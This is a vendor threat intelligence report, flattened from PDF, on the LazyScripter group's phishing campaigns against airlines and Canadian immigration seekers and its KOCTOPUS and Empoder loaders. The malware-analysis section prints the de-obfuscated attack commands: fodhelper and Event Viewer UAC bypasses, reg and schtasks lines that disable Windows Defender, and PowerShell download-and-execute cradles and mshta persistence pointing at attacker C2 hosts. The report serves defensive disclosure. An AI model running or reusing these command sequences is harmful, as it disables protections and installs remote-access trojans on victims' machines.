Threat Intelligence ReportLazyScripter: From Empire to double RATHossein JaziFebruary 20211Table of ContentsExecutive Summary 3Introduction 4 13Timeline of activities and phishing lures Document analysis Archive analysisKOCTOPUS Analysis 15 Registry key variant EmpoderInfrastructure 35Attribution 36Conclusion 37Indicators of Compromise (IOCs) 38MITRE ATT&CK techniques 422February 2021Executive SummaryMalwarebytes’ Threat Intelligence analysts are continually researching and monitoring active malware campaigns and actor groups as the prevalence and sophistication of targeted attacks rapidly evolves. In this paper, we introduce a new APT group we have named LazyScripter, presenting in-depth analysis of the tactics, techniques, procedures, and infrastructure employed by this actor group. Although the observed TTPs have commonality with known actor groups, there are many notable differences setting LazyScripter apart from these groups; these similarities and differences are discussed in the Attribution section of this paper. APT groups are traditionally tracked according to specific targets and tools or methodologies they employ. Many actor groups use spam campaigns, attaching weaponized documents to phishing emails themed to target the industry or demographic of interest. In this case, we initially discovered a number of malicious emails specificallytargeting individuals seeking employment, which prompted a deeper investigation.Digging deeper we uncovered a targeted spam campaign dating back as far as 2018 using phishing lures with themes aimed not only at those seeking immigration to Canada for employment, but also at airlines.In the following analysis, we walk through the timeline of observed TTPs from the initial phishing campaign to the state of the current and ongoing activities of the actor. We take a deep dive into each of the tools used, including the weaponized documents and the multiple variants of malware and exploitation techniques employed. Finally, we detail the infrastructure used and discuss the attribution comparisons with known actor groups such as APT28 and Muddy Water.This in-depth and detailed analysis has revealed a developing campaign by what we believe to be a previously unidentified APT actor. Not only has this campaign been active for several years, but ongoing tracking shows this actor is still maintaining the infrastructure used and is actively updating toolsets. For this reason, we continue to track this new group LazyScripter as the threat evolves.3IntroductionIn late December 2020 we observed a few malicious documents with embedded objects that were designed to target job seekers. The embedded objects were either VBScript or batch files that deployed two open- source multi-stage Remote Access Trojans (RATs): Octopus and Koadic. Interestingly, in some cases the attacker managed to drop other RATs such as LuminosityLink, RMS, Quasar, njRat and Remcos.This triggered our interest to further investigate this threat actor to understand its activities over the past few years. We were able to track them back to at least 2018 with a campaign targeting victims looking to immigrate to Canada. Over time they have used different file types as their initial lures, and they have switched their main toolset from PowerShell Empire to double RAT (Koadic and Octopus).This threat actor is targeting the International Air Transport Association (IATA) and airlines in which we observed several different lures specifically designed to target airlines that are using the BSPLink software. Most recently we observed that they have changed their lure to mimic a new feature recently introduced by IATA called IATA ONE ID (Contactless Passenger Processing tool). This indicates that this actor is constantly updating its toolsets to target new systems developed by IATA.4PhishingIn all their phishing lures the actor has used its loader to spawn a combination of Octopus and Koadic (there were only a few cases with Koadic only). We were able to identify several different variants of this loader: executable, batch, VBScript, and registry files (in which persistence is achieved by writing a PowerShell script into the AutoRun registry key). We named this new loader as KOCTOPUS.This group also has used another loader around 2018 and 2019 to load PowerShell Empire. We named this loader Empoder.As a phishing lure they mainly used either IATA- or job-related themes to target victims. However, we have observed several other phishing lures that have been used by this actor. Here are some of them:IATA security (International Air Transport Association security)• • BSPlink Updater or Upgrade (BSPlink is the global interface for travel agents and airlines to access theIATA Billing and Settlement Plan (BSP)). IATA ONE IDTourism (UNWTO)• • User support kits for IATA users • Canada skill worker program • Canada Visa (CanadaVisa.com is the online presence of the Campbell Cohen Immigration Law Firm)Job informationAnother interest of this actor is targeting people that want to immigrate to Canada through government job- related programs. In one of the specific cases the actor has used the legitimate "Canadavisa.com" site as its phishing lure. Canadavisa is a known Canadian immigration website associated with an immigration firm based in Montreal, Canada.This actor has mainly used spam emails weaponized with either archive or document files as it is initial infection vector. Both zip and document files contain a variant of either KOCTOPUS or Empoder and in some cases they are password protected.The actor has mainly used two GitHub accounts to host its toolsets. Both of these accounts were deleted on Jan 12 and 14 2021, respectively.• url • url 1: GitHub account belonging to threat actorThe actor created a new GitHub account on Feb 2nd 2021 to host its payloads to operate its new spam campaign:Figure 2: New GitHub repositoryTimeline of activities and phishing luresWe were able to collect some of the spam emails used by this actor over the past two years. In these spam emails the actor used several methods to redirect the user to download a variant of KOCTOPUS. The latest campaign was spotted on Feb 5th, 2021 in which the actor was distributing a variant of KOCTOPUS pretending to be “BSPLink Upgrade.exe” and managed to drop a variant of Quasar Rat in addition to OCTOPUS and Koadic. Prior to that we have spotted another campaign on Jan 6th, 2021 in which the actors were distributing a variant of KOCTOPUS pretending to be “IATA ONE ID.exe” software:6Figure 3: Latest spam campaignHere is the list of different lures used by this actor:Figure 4: Latest spam campaign•KOCTOPUS has been archived and distributed as an email attachment to victims.7Figure 5: Spam email variant 1•The spam email contains a PDF file with a link to download a variant of KOCTOPUS.Figure 6: Spam email variant 2Figure 7: Spam email variant 38Figure 8: Attached PDF file•The spam email contains a link that redirects the victim to download KOCTOPUS or a maldoc that has an embedded KOCTOPUS. The link usually is a URL shortener link using shortener services such as bit.ly or cutt.ly that redirects victims to either the attackers’ Github repository or the IP/URL address that hosts the maldoc.Figure 9: Spam email variant 3On March 19th 2020, SANS ISC InfoSec Forums reported a multistage attack that took advantage of the COVID-19 pandemic to distribute its malware. This reported maldoc contains a variant of the KOCTOPUS malware we uncovered in this paper. In that phishing email the actor spoofed the World Health Organization and pretends to provide recommendations.We were able to identify multiple themes used by this actor and the time they have been used in spam campaigns. The following image shows the time frames of the different lures used by the actor.9Figure 10: Lures timeline10Document analysisUnlike most actors that are using macros in their documents to perform malicious activities, this actor has embedded objects that are one of the KOCTOPUS or Empoder variants.We identified 14 malicious documents that have been used by this actor since 2018:Figure 11: List of maldocs used by this actorThe malicious documents usually have one or two embedded objects with either PDF, Microsoft Word or Excel icons to pretend they are another document embedded in the doc while in fact they are either batch, executable, or VBScript variants of KOCTOPUS or Empoder.11Figure 12: Doc Template 112Figure 13: Doc Template 2Archive analysisThe actor has not only relied on maldocs to deliver its loaders but also used archive files that have embedded a variant of KOCTOPUS or Empoder. The following shows the list of archive lures used by this actor since 2018:13Figure 14: List of archive files and their embedded objects14KOCTOPUS AnalysisThe actor has used this loader to load Octopus and Koadic and in some cases other RATs such as LuminosityLink RMS and Quadar RAT. This loader has four different variants which we will describe below.Batch VariantThe batch files used by this actor are highly obfuscated with the BatchEncryption tool. BatchEncryption is an advanced batch obfuscation tool that uses a combination of known and custom environment variable encoding techniques.In this section we provide the analysis of a batch file embedded within the most recent maldoc used by this actor. The following shows the obfuscated version of KOCTOPUS:Figure 15: Overall ProcessFigure 17 shows the list of commands that will be executed by this loader after de-obfuscation.Figure 16: KOCTOPUS Batch Variant ObfuscatedFigure 17: KOCTOPUS Batch Variant Not Obfuscated15This loader starts it activities by checking the OS version using the following command:for /f "tokens=2 delims=," %%i in ('wmic os get caption^,version/format:csv') do set os=%%iThen it looks for number 10 using the find command to identify if the OS is Windows 10. If that is the case, it attempts to bypass User Access Control (UAC) using fodhelper.exe and execute its commands with higher privilege. If the OS version is not 10, it performs UAC bypass through Event Viewer (eventvwr.exe).Fodhelper.exe has been used in Windows 10 to manage language settings. Since this process is running with highest privilege, an attacker can abuse it to execute its malicious commands with the same privilege fodhelper has. When the fodhelper.exe process starts it looks for the three registry keys shown below that by default do not exist. Therefore, an attacker can write its malicious commands in these registry keys to be executed by fodhelper.exe with the highest privilege.HKCU:\Software\Classes\ms-settings\shell\open\command HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute HKCU:\Software\Classes\ms-settings\shell\open\command\(default)This loader has created these registry keys with a PowerShell command:&& reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f && reg add HKCU\Software\Classes\ms- settings\shell\open\command /d "cmd.exe /c powershell -WindowStyle Hidden - command \"IEX (New-Object 'C:\Users\Public\Libraries\sc.bat');\" C:\Users\Public\Libraries\sc.bat" /fTo execute the PowerShell command, fodhelper.exe needs to be executed:&& START /W fodhelper.exeUpon fodhelper execution, PowerShell is executed to download a batch file from a remote server and save it into the Libraries directory and finally execute it. At the end the loader performs the cleanup procedure by deleting the created registry keys with the following command:&& reg delete HKCU\Software\Classes\ms-settings /fIf the OS version is not 10, Event Viewer is used to bypass UAC. When eventvwr.exe is executed it looks for mmc.exe in these two registry locations:HKCU\Software\Classes\mscfile\shell\open\command HKCR\mscfile\shell\open\commandSince the first registry key does not exist then mmc.exe is executed from the second location to load the eventvwr.msc file in order to display the information to the user. An attacker can create this registry key that doesn’t exist in order to execute malicious commands with administrative privileges. In this case the actor has created this registry key with the same PowerShell command as described in the fodhelper.exe bypass.reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "cmd.exe /c powershell -WindowStyle Hidden -command \"IEX (New-Object 'C:\Users\Public\Libraries\sc.bat');\" C:\Users\Public\Libraries\sc.bat" /f16The downloaded batch file (sc.bat) has also been obfuscated using the BatchEncryption tool. After deobfuscation we can see this batch performs the following steps:• Using reg.exe to disable, add or delete all registry keys related to Microsoft Defender and MicrosoftSecurity Essentials. Also, it disables all the Scheduled tasks related to these security products by calling schtasks:reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run " /v "Windows Defender" /f reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f17reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f•Calling PowerShell.exe to download another batch file. The actor has used another URL shortener “is.gd” which redirects to a Github repository to download that batch file:powershell -WindowStyle Hidden -command "IEX (New-Object Net.WebClient).DownloadFile('url s\pus.bat');" C:\Users\Public\Libraries\pus.batThe pus.bat script is also obfuscated by the BatchEncryption tool and executes the following PowerShell command. This command connects to its server to deploy its first multi-stage RAT which is Octopus:powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('url gateway.net:80/hpjs.php');"•Performing the following actions which in fact make both Octopus and Koadic persistence through both the AutoRun registry key and scheduled task.Koadic Persistence:reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "#OneDrive" /t REG_SZ /d "cmd /c powershell -w hidden \"Add-Type - AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('url gateway.net:80/hpjs.php');\""Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile - noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta url gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} "C:\WINDOWS\system32\schtasks.exe" /create /TN AutomaticChromeUpdater /TR "mshta url" /SC minute /mo 6018Octopus Persistence:reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "New Value #1" /t REG_SZ /d "mshta url gateway.net:8080/MicrosoftUpdate" /f powershell Add-MpPreference - ExclusionPath "C:" -FORCEPowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile - noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticU /TR 'C:\Users\Public\Libraries\pus.bat' /SC minute /mo 120} "C:\WINDOWS\system32\schtasks.exe" /create /TN AutomaticU /TR C:\Users\Public\Libraries\pus.bat /SC minute /mo 120The first PowerShell command downloads the Octopus PowerShell agent from the following URL: url This agent has been obfuscated by the attacker.The Octopus agent is responsible for communicating with its C&C server to send and receive commands. To start its communications, it collects the following information from the victim machine:Figure 18: Loading Koadic• Host name (with the addition of five random characters to the end)• User name (if the user name has the administrator role it adds “*” to it)• OS version• OS architecture•The process id that is executing this PowerShell script• Victim’s Network domainThen it builds a header with the following format:19$HEADER = "$hostname, $username, $OS_version, $OS_arch, $process_id, $domain"In the next step, it encrypts the header using AES encryption and then encodes the generated encrypted header using Base64. The Key and IV for encryption are Base64 hardcoded.Then it sends an HTTP get request to its server with the generated header as authorization header field.Figure 19: Encryption functionFigure 20: Http get requestAfter sending the request, it goes into a loop to receive commands from the server. The received commands are specific to the victim and the generated URL is the combination of the C&C URL and generated host name. The received commands are Base64 encoded and AES encrypted and therefore it first decodes and decrypts the commands and then based on the commands it does the required actions.20Figure 21: CommandsHere is the list of commands:•False: If the command is False it does nothing.• Report: It collects victim’s info including list of all of the running processes, local IP address, OS version,last boot time, OS locale and current time and then encrypts and Base64 encodes them and sends them in the authorization HTTP field to the server.• Download: Upload the content of a specified file to the server.•reset-pc: It seems this feature is not still implemented.It also deploys another variant of Octopus agent through JavaScript (mshta url gateway[.]net:8080/hta). This script calls the PowerShell to download the Octopus agent.21Figure 22: Js scriptFigure 23: PowerShell command after deobfuscationAfter deploying Octopus it deploys Koadic by calling mshta:"mshta url" /f powershell Add-MpPreference -ExclusionPath "C:" -FORCEThe actor has used mshta and rundll32.exe for Koadic stagers."C:\Windows\System32\rundll32.exe" url ;UGH09GLI5P=;\ \ \ \./mshtml,RunHTMLApplicationFigure 24 shows the downloaded first stage. This script defines 4 random strings with the following sizes: 101, 118, 97, and 108. These strings’ lengths have been used to build the “eval” by converting each string size number to char.In the next step the obfuscated script that will be executed by eval is deobfuscated by passing it to the deobfuscation function (jRclebKBKY). At the end that deobfuscated script is executed by calling eval.22Figure 24: Downloaded jsThe deobfuscated script collects the following information from the victim and then builds a URL and command and makes an HTTP request to the Koadic server.Figure 25: Deobfuscated js•Checks SeDebugPrivilege through “whoami /all” command• Gets OS version and Build by reading their relative registry locations• Gets group policy history through reading registry location• Gets processor architecture•Lists directories in temp folder• Gets the contents of the IP routing table by executing the “route print” command• Gets computer name and username• Gets Windows code page23Figure 26: Data collectionIn this case, we observed that Koadic acted as a downloader to download and execute RMS, LuminosityLink. In some other cases, the actor used Koadic to drop njRat, Remcos and Quasar RAT."C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -command "& { (New-Object Net.WebClient).DownloadFile('url 'C:\Users\Public\Libraries\1.exe')};" C:\Users\Public\Libraries\1.exe "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -command "& { (New-Object Net.WebClient).DownloadFile('url};" C:\Users\Public\Libraries\Setup-RMS.exe taskkill /f /im rutserv.exe taskkill /f /im rfusclient.exe reg delete "HKLM\SYSTEM\Remote Manipulator System" /f attrib +s +h "C:\Windows\System32\vipcatalog" cd C:\Windows\System32\vipcatalog\ "rutserv.exe" /silentinstall regedit /s regedit.reg "rutserv.exe" /start @exitNgrokWe have observed some other variants of KOCTOPUS where the actor first deployed a modified version of Invoke- Ngrok which is a PowerShell script that exposes local ports of a victim over the internet. This script has an embedded Base64 encoded payload that is decoded and stored in the Libraries directory pretending to be RuntimeBroker.exe. This dropped payload achieved persistence through the AutoRun registry key and a scheduled task.After deploying Ngrok, the loader has deployed both Octopus and Koadic RATs.25ADS-BackdoorFigure 27: Invoke NgrokIn another case, we observed that the actor has tried to use the ADS-Backdoor which is a backdoor persistent module of Nishang Framework. Nishang is an open-source PowerShell-based framework for offensive security, penetration testing, and red teaming.powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('url Checking -URL url -Arguments "CHECK""26Figure 28: ADS-BackdoorExecutable VariantWe were able to find 7 executables associated with KOCTOPUS. All of these executables have been compiled using Pure Basic and have the same compile date (February 1st 2018) and almost all of them were recently uploaded to VirusTotal.Having the same compile time might indicate that they have been developed or modified by an automated tool. After further analysis we identified that all of these samples have been generated using a Bat to Exe Converter tool. In fact, the actor has used a tool to convert its batch loader to an executable. The compile time is predefined in this application and does not show the right compilation time. We believe the right compilation time is around the time that the sample has been uploaded to VirusTotal.27Figure 29: Bat to exe convertorThe samples are using different names to pretend they are legitimate applications. Here are some of the names used by these samples:•••“IATA ONE ID.exe”: This has been distributed through a spam campaign on Jan 6th, 2021. It is using the IATA ONE ID icon to pretend it is that software. ONE ID is a fairly recent concept introduced by IATA for contactless identity management that leverages biometric technology. This indicates that this actor is constantly monitoring new IATA technologies to update its toolsets respectively.“BSPlinkUpdaterV4.exe”: Similar to the “IATA ONE ID” this has been specifically designed to target airlines that are using BSPLink software.“Federal Skilled Worker Program Eligible Occupations Canada Immigration and Visa Information Canada.exe”: This is designed to target people that are applying to the Canada skill worker program. The actor has used decoy documents from a Canada Immigration website (Figure 30 and Figure 31).28Figure 30: Decoy document29Figure 31: Decoy documentThe actor has used several different icons for these executables. Among them we observed one that is an old Malwarebytes icon possibly pretending to be our security software.30Figure 32: Used iconsThis Bat to Exe Converter encrypts the batch loader into its resource section. The executable loads the resource, decrypting its content and then executing the batch file.Here is the main process of this loader:•It creates a directory in the %APPDATA%/Temp directory and then creates a batch file in that directory. The name of the directory and batch files are generated randomly.Figure 33: Create Directory•It looks for resources by their hashes and loads them using the LoadResource API call. This executable contains 2 resources. One of them has been used to generate a key for the RC4 encryption algorithm. The other one is the batch file content that has been encrypted.31Figure 34: Load Resource••It generates the RC4 key from the resource.It decrypts the content of the other resource and writes it into that created batch file. (The encryption key is 6A2148ADADF8D6E529B08D8BD0800A85).•It calls cmd.exe to execute the generated bat file using CreateProcessW.Figure 35: RC4 decryption32Vbscript VariantThe KOCTOPUS vbscript variant has the same functionality as we mentioned in the batch variant with the difference that process execution has been started by a VBScript that calls wscript to execute a PowerShell command. This PowerShell command downloads the batch variant of KOCTOPUS. All of the VBScript files are obfuscated to make analysis more difficult. In the VBA variant, the actor has used the URL shortener cutt.ly to hide its real URL which in this case is a GitHub repository hosted at raw.githubusercontent.com."C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -command "IEX (New-Object Net.WebClient).DownloadFile('url 'C:\Users\Public\Libraries\reguac.bat');" C:\Users\Public\Libraries\reguac.batRegistry key variantThis variant sets the AutoRun registry key with a Powershell command that downloads and executes the batch variant of KOCTOPUS.EmpoderFiigure 36: Reg variantPrior to using Koadic as the main RAT this actor has used PowerShell Empire as its main toolset. To load PowerShell Empire the actor has used its Empire Loader which we call Empoder.Figure 37: WinRaR installerIn fact, the actor has just used a VBS file to load PowerShell Empire, but it has wrapped its VBS into a WinRar installer which is usually bundled with a decoy document. As an example, “Canada Visa.exe” is a WinRar installer that has two bundled files: a VBS file and a decoy PDF document. This one is specifically designed to target users of Canada Visa, a Canadian immigration law firm based in Montreal, Canada. The decoy document was taken from the Canada Visa website.33Figure 38: Canada Visa decoy document34InfrastructureThe actor has leveraged dynamic DNS providers for command-and-control communications. Dynamic DNS providers allow people to create free subdomains on shared domains and as you can see the actor has created five subdomains on four different dynamic DNS domains for the communications.•••••kasperskylab.ignorelist.comhpsj.firewall-gateway.netgooglechromeupdater.twilightparadox.comiatassl-telechargementsecurity.duckdns.orgstub.ignorelist.comFigure 39: Infrastructure35AttributionWe have examined TTPs, toolsets and infrastructure used by this actor to attribute it to any of the known threat actors.Even though some similarities between this actor and documented APT actors such as APT28 and OilRig exist, these indicators are not enough to attribute to any of these groups.• APT28 has used Koadic Rat in its past campaigns; the only similarity between them is the use of Koadicopen-source tool which is not a strong indicator to show any connections between them.• OilRig has used the batch to exe tool to convert its PowerShell scripts into executables. This is a good indicator that can show there is some overlap between this actor and OilRig but there are still some major differences between them that makes us believe they are separate groups.The most similar APT actor to the actor we analyzed in this report is Muddy Water. Here is the list of similarities between them:• Both have used Koadic and Empire in their previous campaigns• Both have used scripting languages such as PowerShell in their campaigns• Both have used GitHub to host their malicious payloads/scripts. Similar to Muddy Water this actor hasadded forks of some popular toolsets to add some legitimacy to its Github account• Both have used scheduled tasks and Registry Run Keys / Startup Folder for persistenceHowever, there are some key differences between them:• Muddy Water has employed targeted spear phishing attacks to perform its operations while this actorrelies on spam campaigns•This actor has employed several open-source frameworks and commercial malware such as Octopus, Nishang, Quasar, Remcos, njRAT, RMS, NetWire and LumosityLink RAT that have not been used by Muddy Water• Unlike Muddy Water that has used macro-weaponized maldocs, this actor has not used macro-embeddeddocuments and instead it directly embeds its loader within the maldocs• Muddy Water has used some custom toolsets such as PowerStats and SharpStats while this actor mainlyrelies on open-source toolsets to perform its operationsIn terms of used infrastructure, we have seen several APT groups that have used dynamic DNS for their C&C communications including Scarlet Mimic, Putter Panda, Turla, Patchwork and APT33. More specifically Scarlet Mimic and Putter Panda have used the same free DNS provider “firewall-gateway.net” for their C&C communications. Still, we have not found any other similarities between these APTs and the actor we analyzed in this report except using a free DNS provider which is not reliable in the attribution process.Based on the differences we provided in this section we believe this is a new actor that has not been documented before and therefore we have decided to track this actor as a new group that we call LazyScripter.36ConclusionIn this paper, we uncovered several campaigns associated to an actor group that we believe has been active since Visa_Information._Canad.pd ngr.ps1OChpjs.ps1 SUPPORT_KITS_USERS.pdf.b kasperskylab.ignorelist.com hpsj.firewall-gateway.net googlechromeupdater.twilightparadox.com iatassl-telechargementsecurity.duckdns.orgScheduled Task Names:WindowsVer AutomaticMozila41MITRE ATT&CK techniquesTactic Spear phishing attachment Spear phishing link Windows command shell Native API PowerShellT1053.005Scheduled TaskT1047 T1546.001 T1546.012Windows Management Instrumentation Change Default File Association Image File Execution Options InjectionT1543.003Windows ServicesT1547.001Registry Run Keys / Startup FolderT1053.005Scheduled TaskT1547.004Win Logon Helper DLLDetailsManual execution by user Manual execution by user Starts CMD.EXE for commands executionExecutes PowerShell scripts Loads the Task Scheduler DLL interface Uses Task Scheduler to run other applications powershell.exe executed via WMI reg.exe Changes default file association svchost.exe Changes Image File Execution Options Creates or modifies windows services Modifies Windows Defender service settings Changes the autorun value in the registry Loads the Task Scheduler DLL interface Uses Task Scheduler to run other applications Changes the login/logoff helper path in the registryT1548.002Bypass User Account ControlUses fodhelper and event viewer to bypass UACPrivilege EscalationT1546.012 Defense Evasion T1562.001Image File Execution Options Injection Disable or Modify Tools Windows File and Directory Permissions Bypass User Account Control Deobfuscate/Decode Files or InformationT1222.001T1112 T1140T1027Obfuscated Files or InformationChanges Image File Execution Options Modifies Windows Defender service settingsUses ATTRIB.EXE to modify file attributesUses REG.EXE to modify Windows registry Starts MSHTA.EXE for opening HTA or HTMLS files Uses RUNDLL32.EXE to load library Uses fodhelper and event viewer to bypass UAC Decodes Base64 and decrypts AES encrypted traffic Uses AES encryption Uses obfuscation tools Uses Base64 encoding Obtains list of running processes42DiscoveryT1057Process DiscoveryC&CExfiltrationT1082 T1041System Information Discovery System Network Configuration Discovery System Owner/User Discovery System Time Discovery Multi-Stage Channels Exfiltration Over C2 ChannelUse Base64 to encode the data Use AES encryption to encrypt the data43Malwarebytes Inc.3979Freedom Circle, 12th FloorSanta Clara, CA 95054USA+1 800 520 2796© 2021 Malwarebytes. All Rights Reserved. Any brand name is the property of its respective owner, is used for identification purposes only, and does not imply product endorsement or affiliation with Malwarebytes. 